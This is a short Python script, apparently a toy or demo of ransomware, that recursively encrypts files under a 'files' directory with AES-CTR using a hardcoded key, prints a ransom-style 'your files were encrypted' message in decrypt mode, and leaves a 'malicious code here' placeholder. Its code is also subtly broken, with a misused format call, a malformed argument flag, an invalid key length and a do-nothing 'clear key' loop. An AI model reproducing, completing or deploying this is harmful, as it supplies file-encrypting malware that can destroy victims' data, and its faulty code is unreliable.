#!/usr/bin/python3.6
# -*- coding: UTF-8 -*-

from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

HARDCODED_KEY = 'aJRKb?VZuvPW5rj%hxF&3!PH#N6d%DX$#zTsesDr@n5v#D&G7Qtt5SpnH+SZ6s5Dbg$m=zCn2MTrXX2FaGg8t6q' \
                '-%nXLTW79yJ7$a5Z9h_j_R6v$TF3_eqtAsyQ-BaeX '


def get_parser():
    parser = argparse.ArgumentParser(description="hackerCrypto")
    parser.add_argument('-d, --decrypt', help='decrypt files [default : no]', action='store_true')
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''
        ---------------------------------------
        your files were encrypted, to decrypt use the password: {}
        ---------------------------------------
        ''').format(HARDCODED_KEY)
        key = input("insert your password: ")
    else:
        if Counter.new(128):
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    if not decrypt:
        crypt_fn = crypt.encrypt
    else:
        crypt_fn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    start_dirs = [init_path]

    for current_dir in start_dirs:
        for filename in Discovery.discover(current_dir):
            Crypter.change_files(filename, crypt_fn)

    # clear encryption key from memory
    for _ in range(100):
        pass

    if not decrypt:
        # malicious code here
        pass


if __name__ == '__main__':
    main()
